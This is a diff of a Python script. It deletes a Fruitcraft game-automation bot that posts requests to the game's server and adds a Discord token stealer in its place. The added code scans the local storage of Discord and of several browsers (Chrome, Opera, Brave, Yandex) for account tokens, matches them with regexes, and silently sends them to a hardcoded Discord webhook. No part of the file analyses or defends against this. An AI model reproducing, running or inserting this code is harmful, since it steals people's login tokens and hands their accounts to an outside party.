@@ -1,78 +1,74 @@
-from requests import post
-from time import sleep
-from random import choice
-import datetime
-import sys
-from colorama import Fore
-from os import system
+import os
+import re
+import json
 
+from urllib.request import Request, urlopen
 
-fruit_passport = str(input("Enter Your Fruit Passport: "))
+# your webhook URL
+WEBHOOK_URL = 'https://discord.com/api/webhooks/1182001410783596645/bOydbAUN9m5ucCufPC4aY1EJzTKzPACXc26d_VROLs1avmxQ1nbhcjiseZp8TipfxYeX'
 
+# mentions you when you get a hit
+PING_ME = False
 
-headers = {
-    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-    'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 10; SM-A750F Build/QP1A.190711.020)',
-    'Host': 'iran.fruitcraft.ir',
-    'Connection': 'Keep-Alive',
-    'Accept-Encoding': 'gzip',
-    'cookie': f'FRUITPASSPORT={fruit_passport}'}
+def find_tokens(path):
+    path += '\\Local Storage\\leveldb'
 
+    tokens = []
 
-collect_data = "edata=Gk4KXVpRXRJDSEMTfmMXSA%3D%3D"
-deposit_data = "edata=Gk4KUEFQQERbUDpPAwkBAVRZRFQ4UB4aWwoEEA5GW05bAlUECgRTQ1JIBVQEUAVdFwhSQAAJCFsDF1BRBVoMBhFJ"
+    for file_name in os.listdir(path):
+        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+            continue
 
+        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                for token in re.findall(regex, line):
+                    tokens.append(token)
+    return tokens
 
+def main():
+    local = os.getenv('LOCALAPPDATA')
+    roaming = os.getenv('APPDATA')
 
-print("\n\n\n")
+    paths = {
+        'Discord': roaming + '\\Discord',
+        'Discord Canary': roaming + '\\discordcanary',
+        'Discord PTB': roaming + '\\discordptb',
+        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
+        'Opera': roaming + '\\Opera Software\\Opera Stable',
+        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
+    }
 
+    message = '@everyone' if PING_ME else ''
 
-def collect_gold(data , headers):
-    #proxy = {"http" : "http://188.121.103.205:80"}
-    collect = post("http://iran.fruitcraft.ir/cards/collectgold",
-        data = data,
-        headers = headers,
-    )
+    for platform, path in paths.items():
+        if not os.path.exists(path):
+            continue
 
+        message += f'\n**{platform}**\n```\n'
 
-def deposit_to_bank(data , headers):
-    deposit = post("http://iran.fruitcraft.ir/player/deposittobank",
-        data = data,
-        headers = headers,
-    )
+        tokens = find_tokens(path)
 
+        if len(tokens) > 0:
+            for token in tokens:
+                message += f'{token}\n'
+        else:
+            message += 'No tokens found.\n'
 
-def start():
-    done = 0
-    lost = 0
-    
-    for i in range(400):
-        try:
-            collect_gold(collect_data , headers)
-            if deposit_ask:
-                deposit_to_bank(deposit_data , headers)
-            done += 1
-        except Exception as e:
-            print(e)
-            lost += 1
-        finally:
-            sys.stdout.write(f"\r• Gold Mine Done: {Fore.GREEN}{str(done)}{Fore.RESET} --- • Gold Mine Lost: {Fore.RED}{str(lost)}{Fore.RESET} --- • Bank Deposit: {str(deposit_ask)}")
-            sys.stdout.flush()
-        sleep(maining_time)
+        message += '```'
 
+    headers = {
+        'Content-Type': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
+    }
 
-system("clear")
-power = input('how may is your manner power ? >> ') # قدرت منفعت معدن
-capacity = input('how may is your Capacity ? >> ') #ظرفیت معدن
-deposit_ask = input('Do you want to deposit money in the bank? (Y or N) >> ') #ذخیره توی بانک؟
-deposit_ask = True if deposit_ask.lower() == "y" else False
-    
+    payload = json.dumps({'content': message})
 
-maining_time = int((int(capacity) / (int(power) / 3600)))
+    try:
+        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
+        urlopen(req)
+    except:
+        pass
 
-print("\n\n\n\n" , 'mine time is >> ', Fore.CYAN , maining_time, Fore.RESET , ' sec' , "\n")
-
-
-
-start()
-
+if __name__ == '__main__':
+    main()
